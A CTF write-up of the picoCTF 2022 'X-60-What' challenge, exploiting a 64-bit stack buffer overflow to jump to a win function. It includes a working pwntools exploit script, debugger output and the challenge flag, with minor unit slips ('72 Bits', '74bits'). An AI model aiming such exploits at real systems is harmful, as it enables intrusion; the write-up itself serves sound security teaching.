Title:  PicoCTF 2022:  X-60-What
Date: 2022-04-07 21:00
Category: PicoCTF
tags: CTF, picoCTF, write-up, binexp
summary: >
	Write up of the X-60-What binexp challenge.
	A twist on the previous binexp challenges introducing 64 Bits.
	
	
# X Sixty What

This is a reasonably standard binexp challenge,
get control of IP and redirect applicatiion flow to a win function.
However, unlike most of the other challenges its 64Bit

## Understanding the Binary


First off lets take a look at what checksec says

```
(env) dang@danglaptop ~/Github/Pico2022/BinExp/x60Wat$ checksec vuln            ✹ ✚ ✭main 
[*] '/home/dang/Github/Pico2022/BinExp/x60Wat/vuln'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

So there are still no real protections,  but this time our binary is 64 Bit.

## Checking the source

Looking through the soucecode we see its almost exactly the same as 
[Buffer Overflow 1]({filename}/picoCTF_2022/Binexp/overflow1.md)

We need to redirect the program flow to hit the win condition.
However, this time we have the extra complicaion of a 64 Bit adressing scheme.


# POC

As with [Buffer Overflow 1]({filename}/picoCTF_2022/Binexp/overflow1.md) our POC 
is reasonably simple

  - Overflow the buffer to control IP
  - Stick the address of the Win function in IP
  - ....
  - Profit
  
  
## A Problem with Cyclic

When the program crashes, its not quite as easy as just grabbing the address from 
IP like we can with a 32bit exploit.

This is because 64bit addresing doesn't actually use all 64Bits,
Instead *only* 48 bits are used, with the remainder used of other
internal functionaliy.  This means if we go above the ```00 00 7F FF
FF FF FF FF``` address we end up with "Interesting" behaviour, as the address is outside of the normal canonical ranges.

This gives us a small problem finding our offset using cyclic.
Lets say we overflow IP wih 6 'A's we end up with ```00 00 41 41 41 41 41 41``` which is a canonical addreess (but likely to cause a segfault), but it does mean the address ends up in IP
If we overflow IP with 7 'A' we end up with ```00 41 41 41 41 41 41 41``` which is a non canonical address (but still an overflow), so the system tends to crash in a more interesting way.

The usual approach with cyclic is to fill the buffer a huge amount of
data, then grab the address of IP. However, if cyclic writes into the
non-canonical range we don't get the address in IP.  This means we need to have a good idea of the offset (+/- 8 Bytes)for cyclic to be useful.   Therefore we need to:

  - Fuzz the offset to IP using something like a binary search then use cyclic to narrow the choices down[^binsearch] 
  - Look elsewhere for the offset.
  
## Looking Elsewhere for the Offset.

As just grabbing the offset from IP is out of the question because it gets mangled when we overflow, we need to look lsewhere.

Fortunately, our knowlege of how the stack gets aranged can help here.

| Stack item          | Address     |
|---------------------|-------------|
| Return Address (IP) | IP          |
| BP                  | IP-8 Bytes  |
| Variable 1          | IP-16 Bytes |
| ....                |             |
| SP                  |             |


So while IP gets mangled, the base pointer should point to a value we know, as it wont have been mangld, and we can use the fact its 8 bytes away to work out IP

Thus using pretty standard Pwntools we can get the address of IP 

```
from pwn import *

p = process("./vuln")

log.info("---- Start Exploit ----")
#Read input
data = p.readline()
log.info("Data is %s", data)
#Get the address


# --- Code for Offset
pause()
p.sendline(cyclic(50))
p.interactive()
```

Which gives us the output:

```
0x00007fa88167d862 in read () from /usr/lib/libc.so.6
(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x00000000004012d1 in vuln ()
(gdb) x/$ebp
0x61616171:     Cannot access memory at address 0x6161617
```

As you can IP is a mangled address,  but the value in BP[^iknow] is something recognisable from Cyclic.
Using this value and adding 8 Bytes gives us the correct offset to control IP  at 64+8 == 72 Bits

```
(env) dang@danglaptop ~/Github/Pico2022/x60Wat$ cyclic -l 0x61616171           1 ↵  ✭main 
64
```

## Address of the Win Funcion 

This time I cracked open R2,  and grabbed the address of the win function


```
[0x00401150]> pdf @sym.flag
/ (fcn) sym.flag 124
|   sym.flag ();
|           ; var char *format @ rbp-0x50
|           ; var file*stream @ rbp-0x8
|           0x00401236      f30f1efa       endbr64
|           0x0040123a      55             push rbp
|           0x0040123b      4889e5         mov rbp, rs
```


## Putting it all together

Now we have the offset (74bits)  and address of function we jump to (0x00401236) we can write our pwntools script to grab the flag

```
from pwn import *

p = process("./vuln")
#p = remote("saturn.picoctf.net", 61533)

OFFSET = 64  #To BP
OFFSET += 8  #TO IP
#TARGET = 0x00401236
#TARGET = 0x401236
TARGET =  0x40123b

data = p.readline()
log.info("%s", data)

payload = b"A"*OFFSET

payload += p64(TARGET)
p.writeline(payload)
p.interactive()
```

Which leads us to the flag

```
(env) dang@danglaptop ~/Github/Pico2022/x60Wat$ python exploit.py                   ✭main 
[+] Opening connection to saturn.picoctf.net on port 61533: Done
[*] b'Welcome to 64-bit. Give me a string that gets you the flag: \n'
[*] Switching to interactive mode
picoCTF{b1663r_15_b3773r_964d9987}
[*] Got EOF while reading in interactive
$  
```



[^binsearch]:  An approach beloved by Lecturers teaching Security (including me), cuz we get to include a bit of Clasic Computer Science(TM) in our clasees
[^iknow]: Yes, I know i can use cyclic with flags for 64Bits,  and look in RBP,  but old, pre pwntools,  habits die hard....
